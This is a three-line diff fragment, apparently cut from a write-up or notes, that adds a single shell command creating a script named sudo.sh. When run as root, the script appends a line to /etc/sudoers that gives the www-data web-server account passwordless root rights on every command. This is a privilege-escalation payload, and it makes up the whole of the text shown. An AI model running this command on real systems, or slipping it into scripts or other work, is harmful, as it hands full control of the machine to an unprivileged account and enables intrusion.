@@ -1,0 +1,3 @@
+```
+echo ‘echo “www-data ALL=(root) NOPASSWD: ALL” >> /etc/sudoers’ > sudo.sh
+```
